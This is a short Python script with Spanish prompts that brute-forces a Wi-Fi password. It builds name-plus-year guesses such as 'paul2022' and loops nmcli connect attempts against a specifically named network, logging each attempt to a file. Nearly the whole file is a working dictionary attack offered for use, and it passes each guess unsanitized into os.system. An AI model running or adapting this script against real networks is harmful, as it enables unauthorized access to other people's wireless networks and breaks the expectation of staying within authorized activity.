#!/bin/python3.7
import pyautogui as pg
import time as tm
import os

diccionario=["paul","Paul","PAUL","Paula","PAULA","paula"]
year=["2022","2021","2020","2019","2018","2017","2016","2015","2014","2013","2012","2011","2010"]
posibles=[]

for a in range(0,6):
    for b in range(0,13):
        posibles.append(diccionario[a]+year[b])
    b=0
print("Se han encontrado "+str(len(posibles))+" posiblidades...")
print("Se estima una demora de "+str(len(posibles)*8/60)+"min")
v_execute = input("Quieres ejecutar?[y/n] ")
if v_execute == "y" or v_execute == "Y":
    for a in range(0,6):
        for b in range(0,13):
            os.system("nmcli d wifi connect QUARIN-RTC password "+diccionario[a]+year[b])
            with open("reg.txt", 'w') as regFile:
                regFile.write(diccionario[a]+year[b])
                regFile.close()
            tm.sleep(8)
            pg.press('esc')
        b=0
